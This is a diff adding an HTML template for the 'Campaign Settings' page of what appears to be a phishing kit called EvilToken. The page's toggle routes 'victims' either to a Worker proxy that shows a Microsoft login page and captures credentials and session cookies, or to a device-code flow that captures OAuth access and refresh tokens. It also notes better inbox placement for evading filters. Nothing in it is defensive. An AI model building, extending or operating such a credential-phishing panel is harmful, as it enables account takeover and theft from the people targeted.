@@ -1,0 +1,38 @@
+{% extends "base.html" %}
+{% block title %}Campaign Settings{% endblock %}
+{% block page_title %}Campaign Settings: {{ campaign.name }}{% endblock %}
+
+{% block content %}
+<div class="glass">
+    <form method="POST">
+        <div style="margin-bottom: 16px;">
+            <label style="display: flex; align-items: center; gap: 12px; cursor: pointer;">
+                <input type="checkbox" name="worker_redirect" value="1" 
+                       {% if campaign.worker_redirect %}checked{% endif %}
+                       style="width: 18px; height: 18px;">
+                <span><strong>✅ Redirect to Worker Proxy</strong></span>
+            </label>
+            <p style="color: var(--text-muted); font-size: 14px; margin: 8px 0 0 32px;">
+                <strong>When enabled:</strong>
+                <ul style="color: var(--text-muted); font-size: 14px; margin: 4px 0 0 32px;">
+                    <li>Victims clicking the EvilToken link will be redirected to the Worker proxy</li>
+                    <li>This captures credentials and session cookies (instead of OAuth tokens)</li>
+                    <li>Better inbox placement than static Worker links</li>
+                    <li>Victims see the Microsoft login page</li>
+                </ul>
+                <br>
+                <strong>When disabled:</strong>
+                <ul style="color: var(--text-muted); font-size: 14px; margin: 4px 0 0 32px;">
+                    <li>Victims see the device code flow</li>
+                    <li>Captures OAuth tokens (access_token, refresh_token)</li>
+                    <li>Standard EvilToken behavior</li>
+                </ul>
+            </p>
+        </div>
+        <div style="margin-top: 20px;">
+            <button type="submit" class="btn btn-primary">💾 Save Settings</button>
+            <a href="/campaign/{{ campaign.id }}/detail" class="btn btn-outline">Cancel</a>
+        </div>
+    </form>
+</div>
+{% endblock %}
